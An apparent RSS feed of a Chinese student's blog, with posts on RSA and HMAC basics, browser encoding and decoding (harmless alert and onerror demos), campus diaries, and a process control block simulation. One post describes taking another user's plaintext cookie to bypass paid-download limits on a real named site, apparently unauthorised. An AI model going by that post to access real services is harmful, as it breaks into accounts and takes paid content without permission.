3) 选择小于n的一个数e，且使e和z没有公因数(即e和z互素)，e将被用于加密
4) 求一个数d，使ed-1可以被z整除，即 ed mod z = 1
d将被用于解密
5) B的公钥kB+是一对数(n,e)
B的私钥kB-是一对数(n,d)
&lt;/code>&lt;/pre>&lt;blockquote>
&lt;p>A加密和B解密的过程如下&lt;/p>
&lt;/blockquote>
&lt;p>设A要发给一个由整数m表示的比特报文(万物皆比特啊)，&lt;/p>
&lt;p>A有公钥(n,e) , 且m &amp;lt; n&lt;/p>
&lt;p>A计算，得加密值C，发给B&lt;/p>
&lt;p>C = m^e mod n&lt;/p>
&lt;p>B有私钥(n,d)&lt;/p>
&lt;p>收到C后解密得到m&lt;/p>
&lt;p>m = C^d mod n&lt;/p>
&lt;blockquote>
&lt;p>工作原理&lt;/p>
&lt;/blockquote>
&lt;p>报文m加密&lt;/p>
&lt;p>C = m^e mod n&lt;/p>
&lt;p>解密&lt;/p>
&lt;p>m = C^d mod n
= (m^e mod n)^d mod n&lt;/p>
&lt;p>因为 (a mod n)^d mod n = a^d mod n
所以&lt;/p>
&lt;p>m = m^(e*d) mod n&lt;/p>
&lt;p>即，只要证明上式即可&lt;/p>
&lt;p>而根据数论中的一个结论:&lt;/p>
&lt;p>如果p和q是素数，且有n=pq和z=(p-1)(q-1)，则&lt;/p>
&lt;p>x^y mod n = x^(y mod z)mod n&lt;/p>
&lt;p>所以&lt;/p>
&lt;p>m^(e&lt;em>d) mod n = m^(e&lt;/em>d mod z) mod n = m^1 mod n = m&lt;/p>
&lt;h1 id="mac">MAC&lt;/h1>
&lt;p>在讲HMAC之前，先得介绍消息认证码MAC(Message Authentication Code)，它和MD5，SHA之类的摘要算法区别在于它需要通信双方知道共享对称密钥(秘密)，因此MAC涉及加密过程&lt;/p>
&lt;blockquote>
&lt;p>MAC工作原理&lt;/p>
&lt;/blockquote>
&lt;ol>
&lt;li>A与B共享一个对称密钥K，是别人不知道的。&lt;/li>
&lt;li>A计算MAC时，要将密钥K作用于消息M。A将消息M和计算后的H1发给B&lt;/li>
&lt;li>B收到M，也用K对M求出H2&lt;/li>
&lt;li>B比较H1和H2，相同则验证了消息的完整性，表明其未被篡改&lt;/li>
&lt;/ol>
&lt;h1 id="hmac">HMAC&lt;/h1>
&lt;p>HMAC是指基于hash的消息认证码(Hash-based Message Authentication Code)，基本思想是服用MD5与SHA-1之类现有消息摘要算法，把消息摘要看成一个黑盒子，用共享秘密密钥加密消息摘要，从而输出MAC。&lt;/p>
&lt;p>即 报文M → hash(M) → K(hash(M))&lt;/p>
&lt;p>具体加密过程不表…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>其实按内容来说这个应该叫密码学入门比较好…但以后再碰上别的算法就会把它们陆续加进来。&lt;/p></description></item><item><title>浅析浏览器的编码与解码</title><link>https://sera.wang/p/%E6%B5%85%E6%9E%90%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81/</link><pubDate>Mon, 13 Aug 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%B5%85%E6%9E%90%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81/</guid><description>&lt;p>一直以来对url编码，html编码，js编码都存在着困惑，比如&lt;/p>
&lt;ol>
&lt;li>url/html/js是如何编码的?&lt;/li>
&lt;li>浏览器又是什么时候按什么顺序进行url/html/js解码?&lt;/li>
&lt;/ol>
&lt;p>读完了the tangled web，翻了些博客，又各种google，我想暂时可以解除一点心中的疑惑了。&lt;/p>
&lt;h1 id="整体简述">整体简述&lt;/h1>
&lt;hr>
&lt;p>在开始之前，我想先简单说一下整体的一个过程:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>在浏览器的地址栏中输入url，发送http请求头(涉及tcp/ip/dns)&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="http://example.com/test.php" target="_blank" rel="noopener"
>http://example.com/test.php&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>远程的web服务器(apache/iis等)接收到url，分析请求头，根据它找到对应资源，返回一个响应头和数据&lt;/p>
&lt;/li>
&lt;li>
&lt;p>浏览器接收到响应的数据后，开始了接下来要讲的解析…&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="如何编码">如何编码&lt;/h1>
&lt;hr>
&lt;p>在开始解析前，我们先看看这些东西是如何编码的&lt;/p>
&lt;ol>
&lt;li>
&lt;p>url编码:&lt;/p>
&lt;p>标准的url结构是:&lt;/p>
&lt;blockquote>
&lt;p>scheme://login:password@address:port/path?quesry_string#fragment&lt;/p>
&lt;/blockquote>
&lt;p>以之前那串url为栗&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="http://example.com/test.php?uid=27&amp;amp;content=on#main" target="_blank" rel="noopener"
>http://example.com/test.php?uid=27&amp;content=on#main&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>这是一串普通的url，即我们平常所见的格式大多和这个类似，也就是说，像开头的 “ http: “，协议后面跟一个冒号，还有之后的两个正斜杠” // “, 后面再跟域名，再跟地址，再跟参数字符串，再跟片段id…&lt;/p>
&lt;p>可以看到，一些符号非常”常规”，比如冒号，正斜杠，问号…这些都是浏览器/服务器用来解析url用于语义分隔的保留字符，如果出现在url里就会破坏语法，影响正常解析，导致的各种有趣的后果以后有机会再讲。&lt;/p>
&lt;p>于是就有了url编码，因为有些保留字符可能确实有必要需要在url里出现，&lt;strong>它以一个百分号%和该字符的ASCII对应的2位十六进制数去替换这些字符&lt;/strong>&lt;/p>
&lt;p>比如，等于号=的url编码为 %3D&lt;/p>
&lt;/li>
&lt;li>
&lt;p>html编码&lt;/p>
&lt;p>我们拿常见的标签举例，&lt;/p>
&lt;blockquote>
&lt;!-- raw HTML omitted -->
&lt;/blockquote>
&lt;p>跟url的问题类似，为了避免在标签内容中出现以及应对某些攻击，某些保留字符出现在文本节点和标签值里是不安全的，比如说多重标签，xss…&lt;/p>
&lt;p>于是就有了html编码，一般以 &lt;strong>&amp;amp;&lt;/strong> 开头，以分号 &lt;strong>;&lt;/strong> 结尾，&lt;/p>
&lt;blockquote>
&lt;p>左尖括号 &amp;lt; 写作 &lt;code>&amp;lt;&lt;/code>&lt;/p>
&lt;p>右尖括号 &amp;gt; 写作 &lt;code>&amp;gt;&lt;/code>&lt;/p>
&lt;p>&amp;amp; 写作 &lt;code>&amp;amp;&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>还可以插入以任意十进制ASCII码或Unicode字符编码，样式为&lt;/p>
&lt;blockquote>
&lt;p>&amp;amp;#数值;&lt;/p>
&lt;/blockquote>
&lt;p>比如&lt;/p>
&lt;blockquote>
&lt;p>左尖括号 &amp;lt; 写作 &lt;code>&amp;lt;&lt;/code>&lt;/p>
&lt;p>右尖括号 &amp;gt; 写作 &lt;code>&amp;gt;&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>js编码&lt;/p>
&lt;p>道理同上，js常见的反斜杠方式编码处理&lt;/p>
&lt;ul>
&lt;li>\b退格符，\t制表符，\v垂直制表符等&lt;/li>
&lt;li>3位数字，不足位数用0补充，按8位原字符八进制字符编码，如 \145 代表 e&lt;/li>
&lt;li>2位数字，不足位数用0补充，按8位原字符16进制字符编码，前缀 x ，如 \x65 代表 e&lt;/li>
&lt;li>4位数字，不足为数用0补充，按16位原字符16进制Unicode数值编码，前缀 u ，如 \u0065 代表 e&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h1 id="浏览器解码处理流">浏览器解码处理流&lt;/h1>
&lt;hr>
&lt;p>先说url的解析吧，浏览器接收时一般不需要对url进行解码处理，只有在发送后，服务器才需要对url进行解码来确定接收参数和定位资源。&lt;/p>
&lt;p>讲完了url，我们开始接下来的部分&lt;/p>
&lt;p>之前说到，浏览器接收到响应数据——一份html文档，下图展示了整个流程&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-8-13/66691532.jpg" alt="img" />&lt;/p>
&lt;p>先简单说一下整个过程，浏览器的HTML解析器先对HTML之类的文档进行解析，构建成DOM节点树，同时，CSS会被CSS解析器解析生成样式表，而JS解析器会对JS脚本进行解析，然后把脚本生成或改变的DOM节点映射到DOM树上，同时也通过CSSOM API映射到CSS样式表里，然后DOM树加上样式表一起渲染构建成框架树，再通过UI就绘制成了一般用户看到的界面了。&lt;/p>
&lt;p>说的生动点，HTML和CSS两种面粉各自先揉成一团，然后用JS这根擀面棍逐一敲打，最后再把两个揉成一团，最后做成面条。（这可能是我讲例子的极限了…）&lt;/p>
&lt;p>&lt;strong>那么，这当中我们目前最关心的解码都发生在什么过程中呢?&lt;/strong>&lt;/p>
&lt;p>先看一段html代码（为了方便，不严格遵从规范了）&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;html&amp;gt;
&amp;lt;h1&amp;gt;Main Title&amp;lt;/h1&amp;gt;
&amp;lt;div class=&amp;quot;content&amp;quot;&amp;gt;
&amp;lt;h2&amp;gt;Second Title&amp;lt;/h2&amp;gt;
&amp;lt;p&amp;gt;Content&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>通过解析器的解析后，它生成了DOM树，长这样&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-8-13/84732141.jpg" alt="img" />&lt;/p>
&lt;p>如果修改一下，比如说把下面这段一部分用html编码&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;h1&amp;gt;Main Title&amp;lt;/h1&amp;gt;
&lt;/code>&lt;/pre>&lt;p>变成&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;&amp;amp;#104;1&amp;gt;Main Title&amp;lt;/h1&amp;gt;
&lt;/code>&lt;/pre>&lt;p>或者&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;h1&amp;gt;M&amp;amp;#97;in T&amp;amp;#105;tle&amp;lt;/h1&amp;gt;
&lt;/code>&lt;/pre>&lt;p>感兴趣的不妨试一下，看看两者有什么区别&lt;/p>
&lt;p>试过了之后，会发现前者没有了html标签的作用，后者是正常的，说到这里其实就可以明白一点html解码的时机了。&lt;/p>
&lt;p>&lt;strong>它是在浏览器构建完DOM树以后才进行解码的&lt;/strong>，当解析器对前者(对标签进行html编码)进行解析时，无法识别为html标签，所以构建不了DOM节点，后者不同，于是成功构建了DOM节点。 而在解析器解析完后，就会进行html解码，于是两者都会解码显示。&lt;/p>
&lt;p>接下来再来讲讲JS的编码与解码，不管是外部引用还是直接写在script标签里，又或者是在html标签的属性里，对于js编码的解码都是相同的，&lt;/p>
&lt;p>同上，先来看一段js代码&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;
alert(&amp;quot;Hello World&amp;quot;);
&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>通过js编码变成&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;
\u0061lert(&amp;quot;Hello World&amp;quot;);
&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>或者&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;script&amp;gt;
alert(&amp;quot;\u0048ello World&amp;quot;);
&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>感兴趣的依旧可以试试看&lt;/p>
&lt;p>我们发现，两者的效果是相同的，但还有一部分同学……收起你们奇怪的想法吧，如果想尝试将括号和引号进行类似转义，会导致失败，原因我没百度到，所以让我对js代码具体处理过程中怎么解析的产生了困惑。&lt;/p>
&lt;p>我们知道，js的脚本处理模型是按照 源码处理-函数解析-代码执行这个执行流来的，每块代码都自成体系处理…所以可能需要看一下Gecko里是怎么处理的…而这个跟我们现在要讲的关系不大，日后再讨论吧！尽管我对此也充满了好奇！但是，先继续我们的内容吧。&lt;/p>
&lt;p>&lt;strong>html和js各自的部分都讲完了，那两者”混合”起来是怎样做的呢?&lt;/strong>&lt;/p>
&lt;p>我们来看这段代码&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;img src=&amp;quot;y.com&amp;quot; onerror=&amp;quot;alert(2)&amp;quot;/&amp;gt;
&amp;lt;p&amp;gt;Hello Parser!&amp;lt;/p&amp;gt;
&amp;lt;script&amp;gt;
var content = document.getElementById(&amp;quot;content&amp;quot;);
var img = document.createElement(&amp;quot;img&amp;quot;);
img.src = &amp;quot;x.com&amp;quot;;
img.setAttribute(&amp;quot;onerror&amp;quot;,&amp;quot;&amp;amp;#97;lert(1)&amp;quot;);
content.appendChild(img);
&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>script脚本中改变了DOM节点树，最后按照顺序解析，先响应2后响应1，如果把script标签移到img标签之前，结果相反。&lt;/p>
&lt;p>嗯这很正常，这说明浏览器是按一种顺序流执行解析的，也说明js对DOM树的影响是先于html解码器的。&lt;/p>
&lt;p>也就是说可以下个结论，html解析完生成DOM树，js解析器会对js编码进行解码，然后对DOM树进行修改，最后修改完的DOM树再进行HTML解码。&lt;/p>
&lt;p>至于怎么XSS就视各种情况见仁见智了。&lt;/p></description></item><item><title>利用越权漏洞下载vol.moe的所有漫画</title><link>https://sera.wang/p/%E5%88%A9%E7%94%A8%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%B8%8B%E8%BD%BDvol.moe%E7%9A%84%E6%89%80%E6%9C%89%E6%BC%AB%E7%94%BB/</link><pubDate>Sun, 05 Aug 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E5%88%A9%E7%94%A8%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%B8%8B%E8%BD%BDvol.moe%E7%9A%84%E6%89%80%E6%9C%89%E6%BC%AB%E7%94%BB/</guid><description>&lt;p>前几天想看一部漫画找到一个不错的站点，顺便就发现了一个越权漏洞，普通用户可以直接具有高级用户的下载权限。&lt;/p>
&lt;p>为了隐私，很多细节都不能放，因为暂时未允许公开，所以就先看一下效果吧。&lt;/p>
&lt;p>代码:&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-8-5/9313906.jpg" alt="img" />&lt;/p>
&lt;p>执行代码&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-8-5/84685411.jpg" alt="img" />&lt;/p>
&lt;p>获取到比如id为10000010的用户的cookie，我们放到bp里&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-8-5/51303251.jpg" alt="img" />&lt;/p>
&lt;p>提交然后发现权限获取成功可以下任意漫画了~&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-8-5/16401895.jpg" alt="img" />&lt;/p>
&lt;p>总结:&lt;/p>
&lt;p>这漏洞原理很简单，就是cookie明文未加密，解决方案就是cookie+salt再用个md5，sha1加密一波，加密过程最好后端执行。&lt;/p></description></item><item><title>校园杂记20: 这是一个认真的实训总结</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B020-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E8%AE%A4%E7%9C%9F%E7%9A%84%E5%AE%9E%E8%AE%AD%E6%80%BB%E7%BB%93/</link><pubDate>Fri, 27 Jul 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B020-%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E8%AE%A4%E7%9C%9F%E7%9A%84%E5%AE%9E%E8%AE%AD%E6%80%BB%E7%BB%93/</guid><description>&lt;p>今天我放假啦，除了听说上交的朋友小学期还没完之外，我应该算是最晚一批放假的大学生了…&lt;/p>
&lt;p>为什么这么晚，因为学校给安排了一个两周的实训，听过各种学长学姐吐槽过这个实训，有说水的有说坑的，大多数…不，应该说基本，都是负面的…于是实训还没开始我这crud小能手就在心里感到不屑。&lt;/p>
&lt;h2 id="实训体验">实训体验&lt;/h2>
&lt;p>当然我这十天也是这么过去的，日常同学拉我组队，日常早早写好自己份的，日常后续填需求，这十天写代码的时间占了1成，打游戏摸鱼的时间占了9成，恍恍惚惚不知道自己在干什么。&lt;/p>
&lt;p>前面一个礼拜是一位姓李的老师，后来说是项目急着上线，第二个礼拜就换了个老师，好像姓刘，叫刘清，年纪感觉快40了(?)如果说李老师给人的第一印象(因为我整天摸鱼，所以只有第一印象)是一个年轻的码农的话，这位刘老师的第一印象则是一个典型的中年程序员，不修边幅，给人一种很随意的感觉，上身深色polo衫，下身灰裤子，有点瘦，头发有点凌乱哈哈哈，总给人一种刚睡起来的赶脚，并且好像也许大概没有陷入知乎上说的程序员中年危机。&lt;/p>
&lt;p>在外包学院这位刘老师的眼皮子底下划了四天水，到了最后一天，大家都做的差不多了，上午项目展示加拍照，下午坐在教室里各自摸鱼，我中午临时接到了两个task，一个是学长的，另一个是学姐的，下午就在那儿写代码。&lt;/p>
&lt;p>这刘老师大概也无聊，就过来瞅瞅，他问了我旁边的朋友比赛进度怎么样了，对话就这样开始了，我突然神经刀的好奇，就问了些后端优化，比如redis啊，负载均衡啊，集群啊，公司安全一般怎么做呀，他都能讲的很详细很清楚，有时候还讲些自己的例子。我这时候才发现之前对外包学院的看法有了改变，也是有厉害的人在的，而实质上，打代码还是要靠经验，而这种经验很多时候是需要兴趣和热情，或者说别的动力驱动着来积累的。我猜想刘老师年轻时候应该也是个很拼的人吧。&lt;/p>
&lt;p>可以说我的很多疑问和不解都在和他的对话中消除了，还有一部分就得等到我自己成了个经验丰富的程序员再说了。&lt;/p>
&lt;p>讲真，这次对话比我在学校里问各种老师的体验好多了…学术和工业界，一个实战，一个理论，我只能说，我跟纯理论派相性不佳🤦‍，不是说不喜欢，只是说很多时候问老师获取不到想要的答案，更何况一些老师脱离一线太久，担任领导后有些老师甚至都不会看代码了，全凭十几年前的经验，所以这些也只有在这种经验老道的老程序员那里才能问到。&lt;/p>
&lt;p>这样想来，这的确是一次宝贵的经历，这波实训真的对我来说不亏了，起码让我懂得工业界经验还是挺有用的。&lt;/p>
&lt;p>刘老师给我讲了很多有趣的东西，语言风格当然和高校老师是不一样的哈哈哈，别具一格的体验。&lt;/p>
&lt;p>这些有趣的东西还是当以后饭桌上的谈资吧，写出来总感觉别扭的慌哈哈哈哈，真的感谢他，讲话原来是很随和的一个人，其实内心是感觉他跟我的伯伯很像，都有一种中年老男人的魅力在啊哈哈哈哈，如果我以后万一有幸成了个合格的程序员真想回去找他再好好聊一聊编程那些事啊。&lt;/p>
&lt;p>但总而言之，除了这位刘老师，其它体验一般，咳咳，这次实训如果是可选的话就好了…&lt;/p>
&lt;p>说到其它体验，我仿佛看到了以后的混吃等死的日子，白天摸鱼打代码，中午和同事去吃饭，下午摸鱼打代码，晚上加班，第二天继续，日复一日……啊啊啊啊不能这样想！！！以后我一定要找个work balance的工作啊！！！天天crud是会让人失去对编程的热情的！！！&lt;/p>
&lt;h2 id="人生思考2">人生思考2&lt;/h2>
&lt;p>最近有开心的事，也有不开心的事，其实想来，不开心的居多吧…唯一开心的还是今天放假了，以及最重要的！！老姐又没放弃我TAT，跟老姐出去逛了一圈，可以说很开心了…愿望清单里加了一条(秘密)哈哈哈哈&lt;/p>
&lt;blockquote>
&lt;p>上帝是公平的，让你遇到了很好的朋友同时，也会让你遇到很极品的傻逼。——我说的&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>我的diss观&lt;/strong>&lt;/p>
&lt;p>大学这两年，我遇到很多用嘴巴学习的同学，也遇到很多好为人师的同学…相处总是心累啊，也有可能是我比较斤斤计较…好了，不开心的少说点，做狗啊，最重要的就是开心。&lt;/p>
&lt;p>&lt;strong>想做的事&lt;/strong>&lt;/p>
&lt;p>这几个月，可能长久以来受很多因素影响，我一直想做个有意思的项目，(开源，集星星，影响力大，拉投资，建公司，走上人生巅峰，娶….咳咳不yy了)&lt;/p>
&lt;p>就跟研究生学长学姐们愁的怎么开题一样，我也在想什么主题，更想做安全那块，之前有过几个idea，现在困了就不写了hhh(才不是因为idea太中二了)&lt;/p>
&lt;h2 id="最后">最后&lt;/h2>
&lt;p>我列过一个愿望清单…给老姐说过，最近还跟宁宁姐聊天说到，宁宁姐看了之后很有兴趣，第二天也列了一个给我看，说是这样有动力，互相勉励，哈哈哈哈，于是我加了一个小愿望，等我找到一个好实习了拿到工资了有机会要带宁宁姐去吃她想次的米其林！！&lt;/p>
&lt;p>真是很让人期待未来啊！！！がんばって！sera同学！为了愿望清单要好好努力呀！要去宁夏找老姐玩儿，要带宁宁姐去吃米其林，要跟未来女票去好多地方啊！&lt;/p></description></item><item><title>校园杂记19: 人生思考</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B019-%E4%BA%BA%E7%94%9F%E6%80%9D%E8%80%83/</link><pubDate>Sat, 16 Jun 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B019-%E4%BA%BA%E7%94%9F%E6%80%9D%E8%80%83/</guid><description>&lt;p>好久没写这个了，因为最近一段时间事情实在太多，现在解决了一坨东西之后，就有了点空闲。&lt;/p>
&lt;p>好吧刚开始写又有事情了…唉&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>以上，是我五天前写的，当时没写完的，忙到(我也不知道在忙什么)现在，正好今天不怎么想复习，就把它写完吧。&lt;/p>
&lt;hr>
&lt;p>话说真是好久没写这个日记了，有两个月了吧，这两个月发生了很多很多的事情，比如 呆在了一个新地方，遇到了很厉害的学长，经常发零食的学姐。&lt;/p>
&lt;p>然后是技术上的，重新看了java，折腾了springboot，还有一个前端框架layui，算是第一次正式用框架写前后端（严格意义上说有了前后台的基本功能了…以及还能看得过去的前端）。以前都是原生拿起来就开始写，这次写的一个软工大作业，算是对MVC有了个更清楚的认识了吧。&lt;/p>
&lt;p>能学到新东西当然挺开心的，但好久没看安全相关的东西，虽然感觉可以从开发角度来学安全，但总是有种焦虑感，然后看着别人一直提交的各种漏洞艳羡不已…&lt;/p>
&lt;p>唉不能总是一直丧呀，突然感觉自己其实挺厉害的！厚厚一本800页的四天能够看完，学东西非常快上手，执行力挺强滴…还有…就想不出来还有什么能吹的了T-T&lt;/p>
&lt;hr>
&lt;p>一直都有人在不断鼓励我，老姐，身边的朋友，也有网上认识的。 感觉给他们添了好多麻烦了呀哈哈哈哈哈😄 那以后可能也要继续麻烦了！&lt;/p>
&lt;p>人和人就是互相支持互相帮助 因此而存在的啊。 因为感受过世界和许多人的温柔和善意，所以现在也会想将这样的美好分享给别人。&lt;/p>
&lt;hr>
&lt;p>现在呆的实验室啊，感觉挺棒的，暑假我还打算把ps4和ns带过来…&lt;/p>
&lt;p>有厉害的学长可以解决很多技术上的问题，还能给你提供很多建议！虽然学长现在去阿里实习了…有两个傻白甜学姐会发零食吃，经常要人帮她们看bug…代码打累了可以看视频，到饭点了聊聊天…&lt;/p>
&lt;p>有空调和超快的wifi，对我来说就够了hhhh&lt;/p>
&lt;hr>
&lt;p>最近本来想重温一下虫师来治愈一下自己，结果跑去看了夏目友人帐，发现也不错，同样会被治愈到。 这些作品都给人一种很温柔的感觉，和这个季节一样。&lt;/p>
&lt;p>今天看了日历，是夏至。 还没有听到蝉鸣，所以心里总感觉夏天还差点什么。 想起以前的夏天啊，凉席，空调，蝉鸣，看番，西瓜，那时候的互联网十分令人新奇。 想来如今也是，只是感觉有点不同了，不同的还有世界观的变化，从以前的黑白分明，到如今考虑的却是各种各样的原因。&lt;/p>
&lt;p>能体谅很多人，能考虑到很多人的感受，但脾气不变，看着不爽的就不会再多说一句。 对温柔的人会回以温柔，对善良的人会回以善良，对不好的便置之不理。&lt;/p>
&lt;hr>
&lt;p>想起来总有人好奇我以后会找个什么样的女票，其实我也很好奇。&lt;/p>
&lt;p>以后啊，会想跟女朋友夏天到日本看烟花大会！逛夏日祭典！想看她穿yukata的样子！ 冬天去北海道看雪！ 还想跟她去看拉斯维加斯的黑客大会DEFCON！去看E3游戏展！去看世界杯！去海边度假吃海鲜…&lt;/p>
&lt;p>给自己打鸡血啊，要变得更好啊…&lt;/p>
&lt;p>谢谢身边的和不在身边的我的朋友们！希望你们都能被世界的温柔包围，遇到困难的时候坚持下去，坚持不下去了那一定要来找我呀！我会告诉你坚持不下去的时候该怎么摸鱼哈哈哈。&lt;/p>
&lt;p>爱你们的Sera ：）&lt;/p></description></item><item><title>代码模拟PCB</title><link>https://sera.wang/p/%E4%BB%A3%E7%A0%81%E6%A8%A1%E6%8B%9Fpcb/</link><pubDate>Wed, 04 Apr 2018 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E4%BB%A3%E7%A0%81%E6%A8%A1%E6%8B%9Fpcb/</guid><description>&lt;p>界面打算参考XAMPP的设计风格，具体核心如何实现先来看一下PCB如何运作的以及目标是要写个什么东西。&lt;/p>
&lt;hr>
&lt;p>PCB， 即进程控制块(Processing Control Block) ，是操作系统核心中一种数据结构，主要表示进程状态。&lt;/p>
&lt;p>这里是实验要求的内容:&lt;/p>
&lt;h3 id="要求">要求&lt;/h3>
&lt;pre tabindex="0">&lt;code>1. 确定PCB内容及其组织方式；
2. 要求模拟进程”新建”、”就绪”、”运行”、”阻塞”和”退出”5个状态；
3. 设计并实现5个进程管理函数: 进程创建(Create()),进程终止(Terminate()),进程调度(Schedule()),进程阻塞(Block()),进程唤醒(Wakeup());
4. 编写主函数，调用5个函数，实现进程管理。
&lt;/code>&lt;/pre>&lt;h3 id="关键点">关键点&lt;/h3>
&lt;pre tabindex="0">&lt;code>1.如何组织进程
确定PCB内容：标识信息、状态和运行时间与存储地址等信息、现场信息、管理信息；
PCB组织方式：链表，分 运行（running），就绪（ready），阻塞（block），空闲（spare）4个列表
&lt;/code>&lt;/pre>&lt;p>我的理解：&lt;/p>
&lt;p>PCB保存内容:
标识信息(Process ID);&lt;/p>
&lt;p>状态 (进程的运行状态);&lt;/p>
&lt;p>运行时间就是此进程从开始进程到此时运行的时间;&lt;/p>
&lt;p>存储地址我觉得可以随便指定一个(因为模拟，所以就模拟个地址);&lt;/p>
&lt;p>现场信息的话，我对此问了下老师，老师让自己想要不要加个程序进去，我想了下，既然是模拟，那可以这样，我模拟五个程序，每个程序要跑的时间是不同的，可以这样实现，每条进程，如果我不中止它，那它的就永远不终止，比如开始时它的指令计数器为1，time.sleep(1)后，这个数字加一…管理信息，我就不是特别清楚，我都画个gui出来了总该清楚的吧&lt;/p>
&lt;pre tabindex="0">&lt;code>2.如何创建进程
申请PCB -&amp;gt; 申请资源 -&amp;gt; 填写PCB -&amp;gt; 挂就绪(ready)队列
&lt;/code>&lt;/pre>&lt;p>直接说就是，要创建了，点create，把它信息顺便就设置好(给它pid,记一下开始时间time.time),申请资源不是很懂，因为python我还没有看过数据结构是怎么实现的&lt;/p>
&lt;pre tabindex="0">&lt;code>3.如何实现处理机调度
a. 按某种策略（如FCFS） 从就绪(ready)队列选择一个进程；
b. 摘取PCB，挂运行（running）队列；
c. 修改状态等PCB内容；设置时钟（运行时间）；恢复现场；
d. 模拟运行： 比如输入”Esc” 进入 “阻塞(Block)”状态，输入”Enter”则运行结束回到就绪（ready）队列；
e. 修改(剩余)运行(running)时间。
&lt;/code>&lt;/pre>&lt;p>根据内容来看，调度(Schedule)这个函数，就是实现把进程从ready队列放到running队列，然后因为running队列内容变了，所以要相应改变PCB的内容，比如运行时间(相当于恢复现场)，
对于实现(d)来说，我不是很明白，模拟运行的意思是什么，我的理解是调用schedule(“esc”)，就会让此进程从running进入block，调用schedule(“enter”),就会让它进入ready队列。&lt;/p>
&lt;h3 id="综上">综上&lt;/h3>
&lt;p>于是我们对于我们要写的东西就有一个总结，所有进程都是一个类，初始化时配置它的标识符(PID),&lt;/p>
&lt;h4 id="状态">状态&lt;/h4>
&lt;p>运行态: running, 进程正在执行。因为是单处理器，同一时刻在运行的进程只有一个。&lt;/p>
&lt;p>就绪态: ready, 进程做好了准备，只要有机会就开始执行,这里要判断优先级，比如3个进程同时ready，的话，先根据优先级判断执行顺序，然后再按FCFS策略来执行进程&lt;/p>
&lt;p>阻塞态: block, 进程在某些时间发生前不能执行，如I/O操作完成&lt;/p>
&lt;p>空闲态: spare, 它表示进程还未被加入可执行进程组，它通常是PCB已经创建但还未加载到内存中的新进程&lt;/p>
&lt;p>退出态: terminate, 要么它自身停止(这个程序中我们一般认为它会一直运行下去，程序计数器一直加一，每次加一后跟time.sleep(1)操作，直到加到一个相当长的数字，比如100，100后自动terminate程序)，或者用户主动中断运行此进程&lt;/p>
&lt;h4 id="函数">函数&lt;/h4>
&lt;p>create()：相当于类的&lt;strong>init&lt;/strong>()函数，&lt;/p>
&lt;p>terminate(): 相当于多线程中的self.runnning = false&lt;/p>
&lt;p>schedule(): 这个函数实现各种中间调度过程，比如用户执行了某些命令，则对进程进行相应操作，&lt;/p>
&lt;p>block(): 使进程进入阻塞队列(block)&lt;/p>
